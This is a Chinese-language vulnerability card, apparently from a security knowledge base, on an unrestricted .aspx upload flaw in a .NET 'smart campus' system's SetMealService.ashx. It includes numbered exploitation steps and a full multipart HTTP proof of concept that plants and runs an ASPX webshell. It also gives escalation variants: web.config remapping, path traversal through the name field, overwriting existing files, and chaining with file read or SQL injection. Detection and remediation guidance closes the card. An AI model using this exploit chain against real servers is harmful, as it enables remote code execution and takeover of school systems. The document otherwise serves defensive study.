---
id: web-generic-file-upload-dotnet-uploadpicture-aspx-webshell
title: .NET uploadPicture 无后缀校验覆盖上传：aspx webshell 直接 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-uploadpicture-unrestricted-aspx-upload
aliases:
- 智慧校园任意文件上传
- SetMealService uploadPicture
- name+extension 上传
- aspx 上传 getshell
- uploadFile setMealPicture
tags:
- file-upload
- dotnet
- ashx
- aspx
- webshell
- iis
- unrestricted-upload
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:02:57+08:00'
  notes: 已通读原文并逐张核对19张图：SetMealService.ashx uploadPicture 分支仅判 file==null 与 ContentLength>2097152，extension=Path.GetExtension(file.FileName) 后 name+extension、File.Delete 覆盖、SaveAs 到 uploadFile\setMealPicture\；实测 name=1&file=1.aspx（内容<% response.write(now()) %>）返回 rows=[uploadFile/setMealPicture/1.aspx]，GET 该 aspx 输出 2025/11/15 0:50:00，getshell 成功，与卡一致。frontmatter 无 sources/source_url；未在本机复跑。
---

## 一句话结论

某智慧校园系统的 `SetMealService.ashx` 在 `action=uploadPicture` 时接收 `name` 与 `file`：只校验文件非空、大小不超过 2MB，然后 `extension = Path.GetExtension(file.FileName)` 直接取原始后缀、`filename = name + extension`，保存到 Web 可访问的 `uploadFile\setMealPicture\` 目录；没有后缀白名单、没有内容类型/魔数校验、没有重命名随机化（name 为空才用 GUID）。攻击者上传 `1.aspx` 内容为 `<% response.write(now()) %>`，响应返回 `uploadFile/setMealPicture/1.aspx`，直接访问即执行，形成 webshell/RCE。

## 原理

- 入口：`SetMealService`（`IHttpHandler`）的 `ProcessRequest`，`action == "uploadPicture"` 时进入上传分支。
- 参数：`name = context.Request.Params["name"]`，`file = context.Request.Files["file"]`；`name` 由客户端控制，`file` 为 multipart 上传文件。
- 校验只有两条：`file == null` → 提示“请选择上传的图片文件”；`file.ContentLength > 2097152` → 提示“上传的图片文件须小于2MB”。**没有** `Path.GetExtension` 后的白名单、没有 `Content-Type` 检查、没有图片头校验。
- 命名：`string extension = Path.GetExtension(file.FileName);` 取原始文件名后缀；`if (string.IsNullOrWhiteSpace(strName)) strName = Guid.NewGuid().ToString("N");` 仅在 `name` 为空时生成随机名；`string filename = strName + extension;`。攻击者传 `name=1` 与 `file.FileName=1.aspx` 即得到 `1.aspx`。
- 落盘：`FileHelper.CreateDomainDir("uploadFile\\setMealPicture\\")` 创建目录；`if (File.Exists(...)) File.Delete(...)` 允许覆盖同名文件；`file.SaveAs(AppDomain.CurrentDomain.BaseDirectory + strFilePath)` 写入；响应返回相对路径。
- 关键点：上传目录位于站点根目录下且 IIS 会解析 `.aspx`；后缀完全由 `file.FileName` 决定，等价于任意文件类型上传。`name` 还可包含子目录/特殊字符（未看到清洗），可能扩大路径控制面。
- 危害：上传 `.aspx`（或 `.asmx`/`.ashx`/`.config` 等 IIS 可解析类型）后直接请求，代码在 w3wp 进程权限下执行，文章用 `<% response.write(now()) %>` 验证成功，随后可替换为命令执行/内存马。
- 根因是“只校验大小不校验类型 + 原始后缀 + 可预测文件名 + Web 可访问目录”，四点叠加使任意文件上传直接变成 RCE。

## 触发条件

- 目标为该智慧校园系统，`SetMealService.ashx` 可访问（文章路径 `/ashx/DCGL/SetMealService.ashx`）。
- `action=uploadPicture` 分支可达，Handler 未继承 `HandleBase` 或鉴权可绕过（文章请求未带 token）。
- 上传目录 `uploadFile/setMealPicture/` 在站点内且 IIS 允许执行 `.aspx`（默认允许）；应用池账户对目录有写权限。
- 文件小于 2MB（文章限制），webshell 内容可远小于该值。

## 利用步骤

1. 构造 multipart 请求：`action=uploadPicture`、`name=1`、`file` 字段文件名 `1.aspx`，内容为最小 webshell（如 `<% response.write(now()) %>`）。
2. 发送到 `/ashx/DCGL/SetMealService.ashx`；响应 `{"resultCode":0,"resultMsg":"上传成功!","rows":["uploadFile/setMealPicture/1.aspx"]}` 表示落盘成功。
3. 直接访问 `/uploadFile/setMealPicture/1.aspx`，页面输出当前时间，证明 ASPX 被解析执行。
4. 将内容替换为命令执行/文件管理/内存马；若同名文件已存在，代码会先删除再写入，可直接覆盖已有文件。
5. 结合任意文件读取（读 web.config 拿连接串）或 SQL 注入进一步扩大控制。

## PoC

```http
POST /ashx/DCGL/SetMealService.ashx HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLotFRaaVYmlgc2bm

------WebKitFormBoundaryLotFRaaVYmlgc2bm
Content-Disposition: form-data; name="action"

uploadPicture
------WebKitFormBoundaryLotFRaaVYmlgc2bm
Content-Disposition: form-data; name="name"

1
------WebKitFormBoundaryLotFRaaVYmlgc2bm
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: application/octet-stream

<%
response.write(now())
%>
------WebKitFormBoundaryLotFRaaVYmlgc2bm--
```

```text
响应（文章截图）：
{"resultCode":0,"resultMsg":"上传成功!","total":0,"rows":["uploadFile/setMealPicture/1.aspx"]}

访问：
GET /uploadFile/setMealPicture/1.aspx
响应：2025/11/15 0:50:00

文章附上传请求与访问成功截图；本卡未在本机复现。
```

## 变体与关联

- 变体（后缀）：`.aspx`、`.ashx`、`.asmx`、`.config`、`.svc` 等 IIS 映射类型；若目标禁用 ASPX 执行，可尝试 `.ashx`/`.asmx` 或上传 `web.config` 改写处理程序映射。
- 变体（文件名）：`name` 非空时直接作为文件名，可尝试 `name=../../shell`（若未清洗）做目录穿越；`name` 为空时用 GUID，仍可预测/枚举路径（响应返回）。
- 变体（覆盖）：同名文件先 `File.Delete` 再 `SaveAs`，可覆盖已有配置/脚本，造成拒绝服务或劫持。
- 关联：同层其他“无限制上传 / aspx getshell”卡片；本卡的具体点是“原始后缀 + name 可控 + Web 目录 + 2MB 限制”。
- 关联：本系统的任意文件读取（getTxt 读 web.config）可为本卡提供配置/凭据；本系统的硬编码 token 鉴权绕过可访问更多上传接口。
- 边界：上传目录被配置为不可执行、或被 IIS 请求过滤（如拒绝 `.aspx` 访问）时，webshell 不能直接执行；2MB 限制不影响小马；若修复为后缀白名单 + 随机名 + 存储到非 Web 目录，链路失效。

## 检测与防御

- 请求检测：`SetMealService.ashx` 的 multipart 文件名后缀为 `.aspx`/`.ashx`/`.asmx`/`.config`/`.svc`；`name` 含路径分隔符或特殊字符；`Content-Type` 与后缀不符（图片接口传脚本）；同一账号/IP 高频上传。
- 主机检测：`uploadFile/setMealPicture/` 出现脚本文件；w3wp 进程写入 `.aspx`；IIS 日志中对上传目录下 `.aspx` 的 GET/POST；文件内容含 `<%`、`<%@`、`eval(` 等特征。
- 修复：后缀白名单（仅 `.jpg/.png/.gif` 等）并同时校验 Content-Type 与文件魔数；服务端重命名为随机 UUID + 固定后缀；上传目录放到 Web 根之外，或禁止脚本执行。
- 修复：不要用客户端 `name` 作为文件名；保存前 `Path.GetFileName` 清洗并拒绝路径分隔符；同名文件不覆盖（返回冲突）。
- 加固：上传目录单独站点/无执行权限；WAF 拦截脚本后缀与双扩展名；对上传接口接入鉴权与配额；定期扫描上传目录中的脚本文件。
- 审计：搜索 `SaveAs`、`Request.Files`、`Path.GetExtension`、`CreateDomainDir` 的调用点；检查是否有后缀白名单、随机命名、非 Web 目录存储三件套。
